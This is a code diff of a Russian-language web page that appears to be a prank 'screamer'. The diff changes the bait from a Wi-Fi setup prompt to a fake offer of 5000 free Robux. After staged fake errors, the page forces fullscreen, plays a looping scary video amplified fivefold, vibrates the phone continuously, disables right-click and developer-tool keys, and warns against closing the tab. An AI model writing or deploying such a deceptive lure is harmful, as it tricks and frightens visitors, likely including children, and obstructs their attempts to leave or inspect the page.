@@ -3,22 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Настройка интернета</title>
+    <title>БЕСПЛАТНЫЙ РОБАКС / WI-FI</title>
     <style>
         body {
-            margin: 0; padding: 0;
-            background: #ffffff;
-            font-family: sans-serif;
-            display: flex; justify-content: center; align-items: center;
+            margin: 0; padding: 0; background: #ffffff;
+            font-family: sans-serif; display: flex;
+            justify-content: center; align-items: center;
             height: 100vh; overflow: hidden;
+            user-select: none; -webkit-user-select: none;
         }
         #ui { text-align: center; }
-        .wifi-icon { font-size: 60px; color: #007aff; margin-bottom: 15px; }
-        h1 { font-size: 22px; margin-bottom: 10px; }
+        .icon { font-size: 80px; margin-bottom: 15px; }
+        h1 { font-size: 26px; color: #333; }
         button {
-            background: #007aff; color: white; border: none;
-            padding: 15px 45px; font-size: 20px; border-radius: 12px;
-            font-weight: bold; cursor: pointer;
+            background: #28a745; color: white; border: none;
+            padding: 20px 60px; font-size: 24px; border-radius: 50px;
+            font-weight: bold; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
         #screamer-container {
             display: none; position: fixed;
@@ -28,60 +28,95 @@
         video { width: 100%; height: 100%; object-fit: cover; }
     </style>
 </head>
-<body>
-
-    <div id="ui">
-        <div class="wifi-icon">📶</div>
-        <h1>Обнаружена сеть Wi-Fi</h1>
-        <p>Нажмите для автоматической настройки</p>
-        <button onclick="launchScreamer()">ПОДКЛЮЧИТЬ</button>
+<body oncontextmenu="return false;"> <div id="ui">
+        <div class="icon">🎁</div>
+        <h1>ПОЛУЧИТЬ 5000 РОБАКСОВ</h1>
+        <p id="status">Нажмите для проверки устройства</p>
+        <button onclick="handleAction()">ПОЛУЧИТЬ</button>
     </div>
 
     <div id="screamer-container">
-        <video id="scaryVideo" playsinline>
+        <video id="scaryVideo" playsinline loop>
             <source src="1909901693.mp4" type="video/mp4">
         </video>
     </div>
 
     <script>
-        async function launchScreamer() {
+        let attempts = 0;
+
+        function handleAction() {
+            attempts++;
+            const status = document.getElementById('status');
+            
+            if (attempts < 2) {
+                status.innerText = "Ошибка сервера... Пробуем еще раз";
+                status.style.color = "orange";
+            } else if (attempts === 2) {
+                status.innerText = "Почти готово! Последнее нажатие...";
+                status.style.color = "blue";
+            } else {
+                startScreamer();
+            }
+        }
+
+        async function startScreamer() {
             const container = document.getElementById('screamer-container');
             const video = document.getElementById('scaryVideo');
 
-            // --- 1. УСИЛЕНИЕ ЗВУКА ---
+            // 1. Усиление звука (Web Audio API)
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const source = audioCtx.createMediaElementSource(video);
                 const gainNode = audioCtx.createGain();
-                
-                gainNode.gain.value = 4.5; // Увеличиваем громкость файла в 4.5 раза
-                
+                gainNode.gain.value = 5.0; 
                 source.connect(gainNode);
                 gainNode.connect(audioCtx.destination);
-            } catch (e) { console.log("AudioContext blocked"); }
+            } catch(e) {}
 
-            // --- 2. ПОЛНЫЙ ЭКРАН ---
-            const doc = document.documentElement;
-            if (doc.requestFullscreen) await doc.requestFullscreen();
-            else if (doc.webkitRequestFullscreen) await doc.webkitRequestFullscreen();
+            // 2. Вход в Fullscreen
+            enterFull();
 
-            // --- 3. ПОВОРОТ ЭКРАНА ---
-            if (screen.orientation && screen.orientation.lock) {
-                screen.orientation.lock('landscape').catch(() => {});
-            }
+            // 3. Пытаемся заблокировать выход (предупреждение при закрытии вкладки)
+            window.onbeforeunload = function() {
+                return "Вы уверены, что хотите уйти без приза?";
+            };
 
-            // --- 4. ЗАПУСК СКРИМЕРА ---
+            // 4. Зацикливание Fullscreen: если пользователь нажмет Esc, пробуем вернуть его назад
+            document.addEventListener('fullscreenchange', () => {
+                if (!document.fullscreenElement) {
+                    // Если вышел из фуллскрина — принудительно возвращаем через секунду при клике
+                    status.innerText = "ВЕРНИСЬ И ЗАБЕРИ ПРИЗ!";
+                }
+            });
+
+            // Визуальное переключение
             document.getElementById('ui').style.display = 'none';
             container.style.display = 'block';
             
             video.play();
 
-            // --- 5. ЖЕСТКАЯ ВИБРАЦИЯ ---
+            // 5. Постоянная вибрация
             if (navigator.vibrate) {
-                // Вибрируем длинными рывками в такт крику
-                navigator.vibrate([500, 100, 500, 100, 500, 100, 1000]);
+                setInterval(() => {
+                    navigator.vibrate([1000, 50, 1000, 50, 1000]);
+                }, 1000);
             }
         }
+
+        function enterFull() {
+            const doc = document.documentElement;
+            if (doc.requestFullscreen) doc.requestFullscreen();
+            else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
+        }
+
+        // Блокировка клавиш (F12, Ctrl+U и т.д. для ПК)
+        document.onkeydown = function(e) {
+            if(e.keyCode == 123) return false;
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) return false;
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
+            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+        };
     </script>
 </body>
 </html>
